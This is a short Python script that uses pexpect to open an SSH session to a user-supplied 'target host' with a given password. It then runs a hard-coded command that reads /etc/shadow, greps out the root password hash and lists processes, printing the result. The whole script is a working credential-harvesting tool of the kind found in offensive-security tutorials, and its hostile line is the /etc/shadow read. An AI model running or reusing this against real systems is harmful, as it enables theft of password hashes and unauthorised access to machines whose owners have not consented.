#! /usr/bin/python

import pexpect

PROMPT = ["# ", ">>> ", "> ", "\$"]

def send_command(child, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before.decode("UTF-8"))
	child.close()

def connect(user, host, password):
	ssh_newkey = "Are you sure you want to continue connecting"
	connStr = "ssh " + user + "@" + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
	if ret == 0:
		print("[-] Error Connecting")
		return
	elif ret == 1:
		child.sendline("yes")
		ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
		if ret == 0:
			print("[-] Error Connecting")
			return
	child.sendline(password)
	child.expect(PROMPT)
	return child

def main():
	host = input("Enter target host: ")
	user = input("Enter username: ")
	password = input("Enter password: ")
	child = connect(user, host, password)
	command = "cat /etc/shadow | grep root; ps"
	send_command(child, command)

if __name__ == "__main__":
	main()
